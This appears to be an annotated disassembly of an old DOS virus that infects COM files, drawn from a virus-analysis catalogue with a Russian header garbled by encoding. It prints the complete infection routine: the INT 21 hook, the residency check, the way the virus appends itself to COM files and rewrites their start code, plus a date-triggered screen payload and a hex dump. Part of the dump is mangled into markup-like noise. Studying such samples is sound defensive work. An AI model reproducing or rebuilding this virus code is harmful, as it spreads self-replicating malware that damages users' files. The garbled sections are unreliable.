

* „«¨­  4A9 (1193)
* ®àâ¨â ¢ ­ ç «¥ 0E ¡ ©â
* Žªàã£«ï¥â ¡¥§­ ¤¥¦­®
* ¥à¥¤ ¯à §¤­¨ª ¬¨ èãâª¨ ­  íªà ­¥ ¨ ­¥ § à ¦ ¥â
* à¨ ­¥ª®â®àëå BIOS ­¥ èãâ¨â
*0100 FA             CLI
*0101 8CC8           MOV       AX,CS
*0103 03060C01       ADD       AX,Word Ptr [010C]
*0107 50             PUSH      AX
*0108 33C0           XOR       AX,AX
*010A 50             PUSH      AX
*010B CB             RETF
*010C 1801           SBB       Byte Ptr [BX+DI],AL

0000 2EA3D502       MOV       Word Ptr CS:[02D5],AX
0004 2E8C1ECF02     MOV       Word Ptr CS:[02CF],DS
0009 B430           MOV       AH,30
000B CD21           INT       21
000D 3C03           CMP       AL,03
000F 7303           JNB       0014
0011 E90A01         JMP       011E               MSDOS 2.xx
0014 8CC8           MOV       AX,CS
0016 8ED8           MOV       DS,AX              DS=CS
0018 BE2D03         MOV       SI,032D
001B C43E6B03       LES       DI,DWord Ptr [036B]
001F B93E00         MOV       CX,003E
0022 90             NOP
0023 FC             CLD
0024 F3A6           REPZ      CMPSB              Compare BIOS Copyright
0026 746C           JZ        0094               => compared
0028 C43E2903       LES       DI,DWord Ptr [0329]
002C BEE102         MOV       SI,02E1
002F B94800         MOV       CX,0048
0032 90             NOP
0033 F3A6           REPZ      CMPSB              Compare BIOS Copyright
0035 745D           JZ        0094               => compared
0037 B42A           MOV       AH,2A
0039 CD21           INT       21                 System Date
003B BBD702         MOV       BX,02D7            List of 5 fixed Dates
003E B90500         MOV       CX,0005
0041 90             NOP
0042 3B17           CMP       DX,Word Ptr [BX]
0044 7407           JZ        004D               => found in list
0046 43             INC       BX
0047 43             INC       BX
0048 E2F8           LOOP      0042
004A EB48           JMP       0094               => not found
004C 90             NOP
004D CD11           INT       11
004F 253000         AND       AX,0030
0052 3D3000         CMP       AX,0030            Monitor Type
0055 7506           JNZ       005D               => color
0057 B800B0         MOV       AX,B000
005A EB04           JMP       0060
005C 90             NOP
005D B800B8         MOV       AX,B800
0060 8EC0           MOV       ES,AX              Screen Memory Segment
0062 33FF           XOR       DI,DI
0064 BE6F03         MOV       SI,036F           list of 55h
0067 B9FA00         MOV       CX,00FA (250)      |
006A AD        ÚÄÄ> LODSW                        |
006B 8BD8      ³    MOV       BX,AX              |
006D BA1000    ³    MOV       DX,0010            |
0070 B82007    ³ÚÄ> MOV       AX,0720            |
0073 D1EB      ³³   SHR       BX,1               |
0075 7303      ³³   JNB       007A               |
0077 B8DB07    ³³   MOV       AX,07DB 'Û'        |
007A AB        ³³   STOSW                        |
007B 4A        ³³   DEC       DX                 |
007C 75F2      ³ÀÄÄÄJNZ       0070               |
007E E2EA      ÀÄÄÄÄLOOP      006A               | ‚¥àâ¨ª «ì­ë¥ ¯®«®áë ­  íªà ­¥
0080 33C0           XOR       AX,AX
0082 CD16           INT       16                 Read keyboard
0084 B80006         MOV       AX,0600
0087 B707           MOV       BH,07
0089 33C9           XOR       CX,CX
008B B618           MOV       DH,18
008D B24F           MOV       DL,4F
008F CD10           INT       10                 Clear Screen
0091 E98A00         JMP       011E
0094 B0FE           MOV       AL,FE    <== 0026="" 0035="" 004a="" 0096="" b44b="" mov="" ah,4b="" 0098="" cd21="" int="" 21="" password="" 009a="" 3dcdab="" cmp="" ax,abcd="" 009d="" 747f="" jz="" 011e=""> already in memory
009F 2EA1CF02       MOV       AX,Word Ptr CS:[02CF]
00A3 8ED8           MOV       DS,AX              Restore DS (PSP)
00A5 48             DEC       AX                        MCB
00A6 2EA3D102       MOV       Word Ptr CS:[02D1],AX     Save
00AA 8CC8           MOV       AX,CS
00AC 059600         ADD       AX,0096
00AF 39060200       CMP       Word Ptr [0002],AX
00B3 7269           JB        011E               => Low Memory
00B5 832E02004B     SUB       Word Ptr [0002],+4B       [PSP+2] - 4Bh
00BA 90             NOP
00BB 8CD8           MOV       AX,DS
00BD 050010         ADD       AX,1000            PSP+64K
00C0 3B060200       CMP       AX,Word Ptr [0002]
00C4 761F        ÚÄÄJBE       00E5               => Current MCB > 64K
00C6 A10200      ³  MOV       AX,Word Ptr [0002]
00C9 2E2B06CF02  ³  SUB       AX,Word Ptr CS:[02CF]
00CE D1E0        ³  SHL       AX,1
00D0 D1E0        ³  SHL       AX,1
00D2 D1E0        ³  SHL       AX,1
00D4 D1E0        ³  SHL       AX,1
00D6 A30600      ³  MOV       Word Ptr [0006],AX Correct PSP+6
00D9 2D0400      ³  SUB       AX,0004
00DC 8BE0        ³  MOV       SP,AX
00DE 8BE8        ³  MOV       BP,AX
00E0 C746000000  ³  MOV       Word Ptr [BP+00],0000
00E5 8E060200    À> MOV       ES,Word Ptr [0002]       ES - Segment for resident
00E9 8CC8           MOV       AX,CS              DS=CS
00EB 8ED8           MOV       DS,AX
00ED B9A904         MOV       CX,04A9
00F0 33F6           XOR       SI,SI
00F2 33FF           XOR       DI,DI
00F4 FC             CLD
00F5 F3A4           REP       MOVSB                     Copy to resident area
00F7 2E8E1ED102     MOV       DS,Word Ptr CS:[02D1]     MCB Address
00FC 832E03004B     SUB       Word Ptr [0003],+4B       Modify Length
0101 90             NOP
0102 33C0           XOR       AX,AX
0104 8ED8           MOV       DS,AX                     DS=0
0106 A18400         MOV       AX,Word Ptr [0084]
0109 26A37F02       MOV       Word Ptr ES:[027F],AX
010D A18600         MOV       AX,Word Ptr [0086]
0110 26A38102       MOV       Word Ptr ES:[0281],AX     Save INT 21
0114 C70684005A01   MOV       Word Ptr [0084],015A
011A 8C068600       MOV       Word Ptr [0086],ES        Set new INT 21
011E 8CC8           MOV       AX,CS
0120 8ED8           MOV       DS,AX                     DS=CS
0122 2E8E06CF02     MOV       ES,Word Ptr CS:[02CF]     ES = PSP
0127 BE8402         MOV       SI,0284
012A BF0001         MOV       DI,0100
012D B90E00         MOV       CX,000E
0130 FC             CLD
0131 F3A4           REP       MOVSB                     Restore start of programm
0133 2EC706CB020001 MOV       Word Ptr CS:[02CB],0100
013A 2EA1CF02       MOV       AX,Word Ptr CS:[02CF]
013E 8ED8           MOV       DS,AX
0140 8EC0           MOV       ES,AX
0142 2EA3CD02       MOV       Word Ptr CS:[02CD],AX     Make JMP Far
0146 33DB           XOR       BX,BX
0148 33C9           XOR       CX,CX
014A 33D2           XOR       DX,DX
014C 33F6           XOR       SI,SI
014E 33FF           XOR       DI,DI
0150 33ED           XOR       BP,BP
0152 2EA1D502       MOV       AX,Word Ptr CS:[02D5]     Restore AX
0156 FB             STI
0157 E97001         JMP       02CA      => Programm Start
                                                        ****** INT 21 ENTRY ******
015A 80FC4B         CMP       AH,4B
015D 7403           JZ        0162
015F E91C01         JMP       027E               => not EXEC - continue int 21
0162 3CFE           CMP       AL,FE
0164 7506           JNZ       016C               => not password
0166 B8CDAB         MOV       AX,ABCD            Password
0169 E91701         JMP       0283               => iret
016C 3C00           CMP       AL,00
016E 7403           JZ        0173
0170 E90B01         JMP       027E               => not 4B00 - continue
0173 50             PUSH      AX
0174 53             PUSH      BX
0175 51             PUSH      CX
0176 52             PUSH      DX
0177 56             PUSH      SI
0178 57             PUSH      DI
0179 1E             PUSH      DS
017A 06             PUSH      ES
017B 8BF2           MOV       SI,DX
017D 803C00         CMP       Byte Ptr [SI],00
0180 7503           JNZ       0185
0182 E9F100         JMP       0276               => name without '.'
0185 803C2E         CMP       Byte Ptr [SI],2E   '.'
0188 7403           JZ        018D
018A 46             INC       SI
018B EBF0           JMP       017D
018D 46             INC       SI
018E 0E             PUSH      CS
018F 07             POP       ES
0190 BFA202         MOV       DI,02A2            "COM"
0193 B90300         MOV       CX,0003
0196 F3A6           REPZ      CMPSB
0198 7403           JZ        019D
019A E9D900         JMP       0276               => exit
019D FA             CLI
019E 1E             PUSH      DS
019F 33C0           XOR       AX,AX
01A1 8ED8           MOV       DS,AX
01A3 A19000         MOV       AX,Word Ptr [0090]
01A6 2EA3C602       MOV       Word Ptr CS:[02C6],AX
01AA A19200         MOV       AX,Word Ptr [0092]
01AD 2EA3C802       MOV       Word Ptr CS:[02C8],AX     Save INT 24
01B1 C7069000A502   MOV       Word Ptr [0090],02A5
01B7 8C0E9200       MOV       Word Ptr [0092],CS        Set INT 24
01BB 1F             POP       DS
01BC FB             STI
01BD B80043         MOV       AX,4300            Get File Attributes
01C0 CD21           INT       21
01C2 7303           JNB       01C7
01C4 E99B00         JMP       0262
01C7 F7C10C00       TEST      CX,000C
01CB 7403           JZ        01D0
01CD E99200         JMP       0262               => Vol or System
01D0 2E890ED302     MOV       Word Ptr CS:[02D3],CX     Save Attributem
01D5 33C9           XOR       CX,CX
01D7 B80143         MOV       AX,4301
01DA CD21           INT       21                 Clear Attributes
01DC 7303           JNB       01E1
01DE E98100         JMP       0262
01E1 B8023D         MOV       AX,3D02            Open Write
01E4 CD21           INT       21
01E6 727A           JB        0262
01E8 8BD8           MOV       BX,AX              File Handle
01EA 0E             PUSH      CS
01EB 1F             POP       DS
01EC BA8402         MOV       DX,0284
01EF B8003F         MOV       AX,3F00
01F2 B90E00         MOV       CX,000E
01F5 CD21           INT       21                 Read Start 0E bytes
01F7 7269           JB        0262
01F9 3BC1           CMP       AX,CX
01FB 7513           JNZ       0210
01FD BE8402         MOV       SI,0284
0200 813C4D5A       CMP       Word Ptr [SI],5A4D
0204 745C           JZ        0262               => EXE
0206 BF9402         MOV       DI,0294
0209 B90C00         MOV       CX,000C
020C F3A6           REPZ      CMPSB              Compare with virus start
020E 7452           JZ        0262               => already infected
0210 33C9           XOR       CX,CX
0212 33D2           XOR       DX,DX
0214 B80242         MOV       AX,4202
0217 CD21           INT       21                 Lseek on End of File
0219 B91000         MOV       CX,0010
021C F7F1           DIV       CX
021E 051000         ADD       AX,0010
0221 A3A002         MOV       Word Ptr [02A0],AX Segment for Virus Start
0224 8BF2           MOV       SI,DX
0226 BA0000         MOV       DX,0000
0229 0BF6           OR        SI,SI
022B 7410        ÚÄÄJZ        023D               => Remainder = 0
022D FF06A002    ³  INC       Word Ptr [02A0]    Increment segment
0231 B91000      ³  MOV       CX,0010
0234 2BCE        ³  SUB       CX,SI
0236 B80040      ³  MOV       AX,4000            Round length
0239 CD21        ³  INT       21
023B 7225        ³  JB        0262
023D B9A904      À> MOV       CX,04A9
0240 B80040         MOV       AX,4000
0243 CD21           INT       21                 Write virus
0245 721B           JB        0262
0247 33C9           XOR       CX,CX
0249 33D2           XOR       DX,DX
024B B80042         MOV       AX,4200
024E CD21           INT       21                 On Start of File
0250 7210           JB        0262
0252 BA9402         MOV       DX,0294
0255 B90E00         MOV       CX,000E
0258 B80040         MOV       AX,4000
025B CD21           INT       21                 Write entry code
025D B8003E         MOV       AX,3E00            Close
0260 CD21           INT       21
0262 FA             CLI
0263 33C0           XOR       AX,AX
0265 8ED8           MOV       DS,AX
0267 2EA1C602       MOV       AX,Word Ptr CS:[02C6]
026B A39000         MOV       Word Ptr [0090],AX
026E 2EA1C802       MOV       AX,Word Ptr CS:[02C8]
0272 A39200         MOV       Word Ptr [0092],AX        Reset INT 24
0275 FB             STI
0276 07             POP       ES
0277 1F             POP       DS
0278 5F             POP       DI
0279 5E             POP       SI
027A 5A             POP       DX
027B 59             POP       CX
027C 5B             POP       BX
027D 58             POP       AX
027E EA60147002     JMP       0270:1460
027F   Old INT 21
0283 CF             IRET

0284 E9A30F Start 0E bytes
0280  14 70 02 CF E9 A3 0F 01 00 00 00 00 00 00 00 00 .p..............
0290  00 00 FF FF FA 8C C8 03 06 0C 01 50 33 C0 50 CB ...........P3.P.
0294 Model for start code
     FA             CLI
     8CC8           MOV       AX,CS
     03060C01       ADD       AX,Word Ptr [010C]
     50             PUSH      AX
     33C0           XOR       AX,AX
     50             PUSH      AX
     CB             RETF
02A0  Virus Segment



02A0  18 01 43 4F 4D FA 9C F6 C4 80 75 17 9D 8B EC 83 ..COM.....u.....
02A2  "COM"
                                                 *** INT 24 ENTRY ***
02A5 FA             CLI
02A6 9C             PUSHF
02A7 F6C480         TEST      AH,80
02AA 7517           JNZ       02C3
02AC 9D             POPF
02AD 8BEC           MOV       BP,SP
02AF 83C51C         ADD       BP,+1C
02B2 834E0001       OR        Word Ptr [BP+00],+01
02B6 83C406         ADD       SP,+06
02B9 58             POP       AX
02BA 5B             POP       BX
02BB 59             POP       CX
02BC 5A             POP       DX
02BD 5E             POP       SI
02BE 5F             POP       DI
02BF 5D             POP       BP
02C0 1F             POP       DS
02C1 07             POP       ES
02C2 CF             IRET

02C3 9D             POPF
02C4 FB             STI
02C5 EA5605D125     JMP       25D1:0556
02C6   Save INT 24
02CA EA00000000     JMP       0000:0000
02CB   On Start of programm
02B0  C5 1C 83 4E 00 01 83 C4 06 58 5B 59 5A 5E 5F 5D ...N.....X[YZ^_]
02C0  1F 07 CF 9D FB EA 56 05 D1 25 EA 00 00 00 00 05 ......V..%......
02CF  Save DS on entry                 <== 0004="" 009f="" 00c9="" 0122="" 013a="" 02d0="" 0f="" 04="" 0f="" 20="" 00="" 00="" 00="" 17="" 02="" 07="" 03="" 16="" 04="" 1e="" 04="" 06="" ...="" ............="" 02d1="" mcb="" address="" (for="" psp)="" 02d3="" save="" attributes="" 02d5="" save="" ax="" 02d7="" list="" of="" 5="" fixed="" dates="" 23:02="" 07:03="" 22:04="" 30:04="" 06:11="" 02e0="" 0b="" 28="" 43="" 29="" 31="" 39="" 38="" 37="" 20="" 41="" 6d="" 65="" 72="" 69="" 63="" 61="" .(c)1987="" america="" 02e1="===============" 02f0="" 6e="" 20="" 4d="" 65="" 67="" 61="" 74="" 72="" 65="" 6e="" 64="" 73="" 20="" 49="" 6e="" 63="" n="" megatrends="" inc="" 0300="" 2e="" 32="" 38="" 36="" 2d="" 42="" 49="" 4f="" 53="" 20="" 28="" 43="" 29="" 31="" 39="" 38="" .286-bios="" (c)198="" 0310="" 39="" 20="" 41="" 6d="" 65="" 72="" 69="" 63="" 61="" 6e="" 20="" 4d="" 65="" 67="" 61="" 74="" 9="" american="" megat="" 0320="" 72="" 65="" 6e="" 64="" 73="" 20="" 49="" 6e="" 63="" e0="" e2="" 00="" f0="" 28="" 63="" 29="" rends="" inc....(c)="" 0329="==========" -="" es:di="" 032d="=======" 0330="" 20="" 43="" 4f="" 50="" 59="" 52="" 49="" 47="" 48="" 54="" 20="" 31="" 39="" 38="" 34="" 2c="" copyright="" 1984,="" 0340="" 31="" 39="" 38="" 37="" 20="" 41="" 77="" 61="" 72="" 64="" 20="" 53="" 6f="" 66="" 74="" 77="" 1987="" award="" softw="" 0350="" 61="" 72="" 65="" 20="" 49="" 6e="" 63="" 2e="" 41="" 4c="" 4c="" 20="" 52="" 49="" 47="" 48="" are="" inc.all="" righ="" 0360="" 54="" 53="" 20="" 52="" 45="" 53="" 45="" 52="" 56="" 45="" 44="" 74="" 80="" 00="" f0="" 55="" ts="" reservedt...u="" 036b="==========" -="" es:di="" 036f="" 0370="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0380="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0390="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 03a0="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 03b0="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 03c0="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 03d0="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 03e0="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 03f0="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0400="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0410="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0420="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0430="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0440="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0450="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" uuuuuuuuuuuuuuuu="" 0460="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 55="" 74="" 06="" b8="" 01="" 00="" e9="" 0a="" uuuuuuuuut......="" 0470="" ff="" fe="" 06="" a3="" 24="" bf="" 20="" 25="" 8b="" 1d="" 83="" c3="" 0f="" b1="" 04="" d3="" ....$.="" %........="" 0480="" eb="" 89="" 1e="" 8f="" 24="" e9="" d4="" fe="" 80="" 3e="" a2="" 24="" 01="" 75="" 06="" b8="" ....$....="">.$.u..
0490  01 00 E9 E6 FE C6 06 A2 24 01 E9 BF FE E9 F7 00 ........$.......
04A0  1E 56 C5 36 20 25 8B D6 B8 F0 01 26 C6 44 FE 9A .V.6 %.....&.D..

</==></==>